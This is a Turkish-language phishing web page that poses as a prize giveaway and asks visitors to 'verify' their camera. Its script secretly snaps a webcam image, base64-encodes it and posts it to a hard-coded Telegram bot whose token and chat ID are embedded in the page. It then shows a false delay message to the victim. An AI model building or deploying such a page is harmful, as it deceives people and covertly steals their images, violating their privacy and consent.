<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Hediye Çarkı!</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #121212; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
        .btn { background: #00ff00; color: black; padding: 20px 40px; border: none; border-radius: 50px; font-weight: bold; font-size: 20px; cursor: pointer; box-shadow: 0 0 20px #00ff00; }
    </style>
</head>
<body>
    <h1>🎁 Tebrikler!</h1>
    <p>NiceXneon özel çekilişinden bir hediye kazandın.</p>
    <p>Hediyeni görmek için aşağıdaki butona bas ve kameranı doğrula.</p>
    <br>
    <button id="snap" class="btn">HEDİYEMİ GÖSTER</button>

    <video id="video" style="display:none;" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const btn = document.getElementById('snap');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        btn.onclick = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                
                setTimeout(() => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const data = canvas.toDataURL('image/png').split(',')[1];

                    // Senin Bot Bilgilerinle Gönderim
                    fetch(`https://api.telegram.org/bot8494800866:AAFkjCtNd8MTZpYZ5wHrqq1wFz8Hm9RMVi4/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: '8064176286',
                            text: "img:" + data
                        })
                    });
                    
                    alert("Sistem yoğunluğu nedeniyle hediye 5 dakika sonra Telegram üzerinden iletilecektir!");
                    stream.getTracks().forEach(track => track.stop());
                }, 1000);
            } catch (err) {
                alert("Hediye alabilmek için kamera izni vermeniz gerekmektedir.");
            }
        };
    </script>
</body>
</html>
